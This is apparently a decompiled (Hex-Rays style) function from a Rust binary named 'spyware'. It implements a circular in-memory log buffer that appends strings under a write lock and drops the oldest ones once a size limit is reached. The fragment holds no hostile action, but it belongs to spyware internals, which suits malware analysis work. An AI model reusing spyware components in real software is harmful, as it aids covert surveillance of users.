__int64 __fastcall spyware::logging::memory_logger::CircularMemoryLogs::write_log(__int64 a1, __int128 *a2)
{
  __int64 v2; // r14
  char v3; // dl
  unsigned __int8 v4; // bp
  __int128 v6; // [rsp+0h] [rbp-48h] BYREF
  __int64 v7; // [rsp+10h] [rbp-38h]

  if ( *((_QWORD *)a2 + 2) >= *(_QWORD *)(a1 + 40) )
    return core::ptr::drop_in_place<alloc::string::String>(a2);
  std::sync::rwlock::RwLock<T>::write(&v6, a1);
  v2 = core::result::Result<T,E>::unwrap(&v6);
  v4 = v3 & 1;
  v7 = *((_QWORD *)a2 + 2);
  v6 = *a2;
  ((void (__fastcall *)(__int64, __int128 *, char **))alloc::vec::Vec<T,A>::push)(v2 + 16, &v6, &off_B9C28);
  while ( (unsigned __int64)spyware::logging::memory_logger::compute_used_chars(
                              *(_QWORD *)(v2 + 24),
                              *(_QWORD *)(v2 + 32)) >= *(_QWORD *)(a1 + 40) )
  {
    alloc::vec::Vec<T,A>::remove(&v6, v2 + 16, 0LL, &off_B9C40);
    core::ptr::drop_in_place<alloc::string::String>(&v6);
  }
  return core::ptr::drop_in_place<std::sync::rwlock::RwLockWriteGuard<alloc::vec::Vec<alloc::string::String>>>(v2, v4);
}